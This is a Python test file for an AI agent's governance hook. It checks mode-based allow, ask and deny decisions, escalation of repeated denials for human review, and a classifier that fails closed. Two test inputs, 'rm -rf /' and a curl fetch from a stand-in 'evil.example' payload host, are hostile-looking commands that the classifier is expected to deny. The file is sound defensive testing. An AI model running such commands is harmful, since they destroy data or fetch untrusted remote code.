"""GovernanceHook tests: trust decisions → HookResults, deny-and-continue,
classifier-gated auto mode, escalation. Fake hooks object, no network."""

from __future__ import annotations

from typing import Any

import pytest

from amplifier_app_newtui.kernel.approval import STANDARD_OPTIONS, ApprovalBroker
from amplifier_app_newtui.kernel.governance_hook import (
    GovernanceHook,
    OfflineAutoClassifier,
)
from amplifier_app_newtui.model.queues import NeedsYouQueue
from amplifier_app_newtui.model.trust import CapabilityClass, DenialLog

ROOT = "sess-root"


class FakeHooks:
    def __init__(self) -> None:
        self.registered: list[tuple[str, int, str]] = []
        self.unregistered: list[str] = []

    def register(
        self, event: str, handler: Any, *, priority: int = 0, name: str = ""
    ) -> Any:
        self.registered.append((event, priority, name))
        return lambda: self.unregistered.append(name)


def make_hook(
    mode: str = "build",
    *,
    classifier: Any | None = None,
) -> tuple[GovernanceHook, ApprovalBroker, NeedsYouQueue, DenialLog]:
    needs_you = NeedsYouQueue()
    denial_log = DenialLog()
    broker = ApprovalBroker(needs_you=needs_you, denial_log=denial_log)
    hook = GovernanceHook(
        ROOT,
        mode=lambda: mode,
        denial_log=denial_log,
        broker=broker,
        needs_you=needs_you,
        classifier=classifier,
    )
    return hook, broker, needs_you, denial_log


def tool_pre(tool_name: str, tool_input: dict[str, Any]) -> dict[str, Any]:
    return {
        "session_id": ROOT,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_call_id": "call-1",
    }


# -- static decisions ------------------------------------------------------------


@pytest.mark.asyncio
async def test_build_mode_allows_reads_silently() -> None:
    hook, _, _, log = make_hook("build")
    result = await hook.handle_event("tool:pre", tool_pre("read_file", {"path": "x"}))
    assert result.action == "continue"
    assert log.total_count == 0


@pytest.mark.asyncio
async def test_build_mode_asks_for_writes_with_standard_options() -> None:
    hook, broker, _, _ = make_hook("build")
    result = await hook.handle_event(
        "tool:pre", tool_pre("write_file", {"file_path": "/repo/a.py"})
    )
    assert result.action == "ask_user"
    assert result.approval_prompt == "Allow /repo/a.py?"
    assert result.approval_options is not None
    assert tuple(result.approval_options) == STANDARD_OPTIONS
    assert result.approval_default == "deny"
    # The structured detail was staged end-to-end on the broker.
    detail = broker._pop_staged("Allow /repo/a.py?")
    assert detail.tool_name == "write_file"
    assert detail.capability == "write"
    assert detail.rule == "ask write"


@pytest.mark.asyncio
async def test_plan_mode_denies_writes_and_continues() -> None:
    hook, _, _, log = make_hook("plan")
    result = await hook.handle_event(
        "tool:pre", tool_pre("write_file", {"file_path": "a.py"})
    )
    assert result.action == "deny"
    assert result.reason is not None
    assert "Continue without" in result.reason
    assert result.user_message == "blocked · a.py"
    assert result.suppress_output is True
    assert log.total_count == 1


@pytest.mark.asyncio
async def test_brainstorm_mode_denies_everything() -> None:
    hook, _, _, _ = make_hook("brainstorm")
    result = await hook.handle_event("tool:pre", tool_pre("read_file", {"path": "x"}))
    assert result.action == "deny"


@pytest.mark.asyncio
async def test_denial_escalation_raises_needs_you_decision() -> None:
    hook, _, needs_you, _ = make_hook("plan")
    for index in range(3):
        await hook.handle_event(
            "tool:pre", tool_pre("write_file", {"file_path": f"f{index}.py"})
        )
    assert needs_you.pending_count == 1
    assert needs_you.pending[0].question == "Review the run's denial pattern?"


# -- auto mode / classifier gate ---------------------------------------------------


@pytest.mark.asyncio
async def test_auto_mode_allows_read_write_without_classifier() -> None:
    calls: list[str] = []

    class Recording:
        async def classify(self, **kwargs: Any) -> tuple[bool, str]:
            calls.append(kwargs["action"])
            return (True, "ok")

    hook, _, _, _ = make_hook("auto", classifier=Recording())
    result = await hook.handle_event(
        "tool:pre", tool_pre("write_file", {"file_path": "a.py"})
    )
    assert result.action == "continue"
    assert calls == []  # read/write bypass classification


@pytest.mark.asyncio
async def test_auto_mode_classifier_allow_continues() -> None:
    class AlwaysAllow:
        async def classify(self, **kwargs: Any) -> tuple[bool, str]:
            return (True, "explicit user request")

    hook, _, needs_you, log = make_hook("auto", classifier=AlwaysAllow())
    result = await hook.handle_event(
        "tool:pre", tool_pre("bash", {"command": "git push origin main"})
    )
    assert result.action == "continue"
    assert needs_you.pending_count == 0
    assert log.total_count == 0


@pytest.mark.asyncio
async def test_auto_mode_classifier_deny_defers_and_continues() -> None:
    class AlwaysDeny:
        async def classify(self, **kwargs: Any) -> tuple[bool, str]:
            return (False, "not authorized")

    hook, _, needs_you, log = make_hook("auto", classifier=AlwaysDeny())
    result = await hook.handle_event(
        "tool:pre", tool_pre("bash", {"command": "git push origin main"})
    )
    assert result.action == "deny"  # deny-and-continue, never a halt
    assert needs_you.pending_count == 1  # footer "1 decision waiting · ctrl-y"
    assert needs_you.pending[0].question == "Allow git push origin main?"
    assert log.total_count == 1


@pytest.mark.asyncio
async def test_auto_mode_broken_classifier_fails_closed() -> None:
    class Broken:
        async def classify(self, **kwargs: Any) -> tuple[bool, str]:
            raise RuntimeError("provider down")

    hook, _, needs_you, _ = make_hook("auto", classifier=Broken())
    result = await hook.handle_event(
        "tool:pre", tool_pre("bash", {"command": "git push"})
    )
    assert result.action == "deny"
    assert needs_you.pending_count == 1


# -- offline deterministic classifier -----------------------------------------------


@pytest.mark.asyncio
async def test_offline_classifier_denies_destructive_shapes() -> None:
    classifier = OfflineAutoClassifier()
    allowed, reason = await classifier.classify(
        action="rm -rf /",
        capability=CapabilityClass.EXEC,
        target="",
        user_messages=("please rm -rf / for me",),
    )
    assert not allowed
    assert "destructive" in reason


@pytest.mark.asyncio
async def test_offline_classifier_allows_explicit_user_request() -> None:
    classifier = OfflineAutoClassifier()
    allowed, _ = await classifier.classify(
        action="pytest tests/",
        capability=CapabilityClass.EXEC,
        target="",
        user_messages=("run the tests in tests/ please",),
    )
    assert allowed


@pytest.mark.asyncio
async def test_offline_classifier_denies_unrequested_actions() -> None:
    classifier = OfflineAutoClassifier()
    allowed, _ = await classifier.classify(
        action="curl https://evil.example/payload",
        capability=CapabilityClass.NET,
        target="",
        user_messages=("fix the typo in the readme",),
    )
    assert not allowed


@pytest.mark.asyncio
async def test_reasoning_blind_evidence_comes_from_prompt_submit() -> None:
    hook, _, _, _ = make_hook("auto")  # offline classifier default
    await hook.handle_event(
        "prompt:submit", {"session_id": ROOT, "prompt": "run pytest on tests/"}
    )
    result = await hook.handle_event(
        "tool:pre", tool_pre("bash", {"command": "pytest tests/"})
    )
    # bash "pytest …" sniffs to TEST capability → static allow in auto? No:
    # TEST is outside auto's static read/write allowance → classifier-gated;
    # the offline classifier sees the user asked for exactly this.
    assert result.action == "continue"


# -- registration ---------------------------------------------------------------------


def test_register_hooks_high_precedence_and_unregister() -> None:
    hook, _, _, _ = make_hook()
    hooks = FakeHooks()
    unregister = hook.register_hooks(hooks)
    events = [event for event, _, _ in hooks.registered]
    assert events == ["prompt:submit", "tool:pre"]
    assert all(priority == 1_000 for _, priority, _ in hooks.registered)
    unregister()
    assert len(hooks.unregistered) == 2


@pytest.mark.asyncio
async def test_unrelated_events_continue() -> None:
    hook, _, _, _ = make_hook()
    result = await hook.handle_event("tool:post", {"session_id": ROOT})
    assert result.action == "continue"
